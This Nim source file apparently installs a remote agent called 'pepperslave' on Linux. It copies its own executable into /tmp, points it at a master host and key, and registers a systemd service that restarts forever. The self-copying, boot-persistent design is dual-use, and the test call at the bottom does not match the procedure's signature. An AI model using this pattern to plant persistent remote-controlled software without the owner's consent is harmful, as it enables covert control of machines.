import os, strutils

const
  # DEFAULT_PATH = "/opt/pepperslave/" # TODO
  SYSTEMD_SERVICE_DIR = "/etc/systemd/system/" # TODO
  DEFAULT_PATH = "/tmp/opt/pepperslave/"
  SYSTEMD_SERVICE_FILE = """
[Unit]
Description=Pepperslave
After=syslog.target network.target

[Service]
Type=simple
PIDFile=/var/run/pepperslave/slave.pid
ExecStart=$#
RemainAfterExit=no
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
"""

proc systemdAutostart(executable: string) = 
  # https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sect-managing_services_with_systemd-unit_files
  # https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sect-Managing_Services_with_systemd-Unit_Files#tabl-Managing_Services_with_systemd-Service_Sec_Options
  let file = SYSTEMD_SERVICE_DIR / "pepperslave.service"
  writeFile(
    file, 
    SYSTEMD_SERVICE_FILE % [executable]
  )
  file.setFilePermissions({
    fpUserRead, fpUserWrite,
    fpGroupRead, fpGroupWrite,
    fpOthersRead
  })
  echo execShellCmd("systemctl daemon-reload")
  # echo execShellCmd("systemctl start pepperslave.service")

proc install*(master: string, port: uint16, pubKey: string, autostart = false): bool =
  # echo "LINUX"
  try:
    echo "[+] creating dirs"
    createDir(DEFAULT_PATH)
    DEFAULT_PATH.setFilePermissions({fpUserExec, fpUserWrite, fpUserRead})
    let newFile = DEFAULT_PATH / getAppFilename().extractFilename
    
    echo "[+] copy files"
    copyFile(getAppFilename(), newFile )
    newFile.setFilePermissions({fpUserExec, fpUserWrite, fpUserRead})
    echo newFile

    echo "[+] change config"
    discard execShellCmd("$# changeMaster --master:$# --port:$# --publicKey:$#" % [newFile, master, $port, pubKey])
    
    echo "[+] adding autostart"
    systemdAutostart(newFile)
    return true
  except:
    echo getCurrentExceptionMsg()
    return false

proc start() =
  discard execShellCmd("systemctl start pepperslave.service")

when isMainModule:
  echo install("", 123, true)